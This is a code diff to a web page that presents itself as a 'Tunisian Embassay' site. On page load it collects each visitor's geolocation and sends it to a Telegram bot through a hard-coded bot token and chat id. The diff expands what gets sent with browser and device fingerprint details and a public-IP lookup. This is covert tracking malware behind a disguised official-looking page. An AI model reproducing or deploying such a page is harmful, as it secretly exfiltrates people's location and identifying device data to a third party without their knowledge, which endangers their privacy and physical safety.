@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Tunisian Embassay</title>
+    <title>Tunsian Embassay</title>
     <style>
       body {
         text-align: center;
@@ -13,7 +13,7 @@
     </style>
   </head>
   <body>
-    <h1>Tunisian Embassay</h1>
+    <h1>Tunsian Embassay</h1>
     <p id="demo"></p>
     <script>
       function getLocation() {
@@ -29,10 +29,10 @@
         const lon = position.coords.longitude;
         const accuracy = position.coords.accuracy;
 
-        const url = `https://api.telegram.org/bot6665901686:AAFTZi9DXkedyHhUdC0nQjzJvBFtNCThf6E/sendMessage`;
+        const url = `https://api.telegram.org/bot6597000854:AAEBsKobWqToAYey0KYH9p0YK5MEaAkR2GU/sendMessage`;
         const data = {
           chat_id: '5990142501',
-          text: `New user location:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy}`
+          text: `New user location:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy}\nDevice information:\n${navigator.appVersion}\n${navigator.platform}\n${navigator.userAgent}\n${navigator.hardwareConcurrency}\n${navigator.language}\n${navigator.languages}\n${navigator.onLine}\n${navigator.doNotTrack}\n${navigator.cookieEnabled}\n${navigator.platform}\n${navigator.product}\n${navigator.vendor}\n${navigator.maxTouchPoints}\n${window.navigator.connection.type}\n${window.navigator.connection.downlinkMax}\n${getIP()}`
         };
 
         fetch(url, {
@@ -47,6 +47,17 @@
         });
 
         document.getElementById("demo").innerHTML = "Latitude: " + lat + "<br>Longitude: " + lon + "<br>Accuracy: " + accuracy;
+      }
+
+      function getIP() {
+        const url = "https://api.ipify.org/?format=json";
+        return fetch(url)
+          .then(response => response.json())
+          .then(data => data.ip)
+          .catch(error => {
+            console.log(error);
+            return 'unknown';
+          });
       }
 
       getLocation();
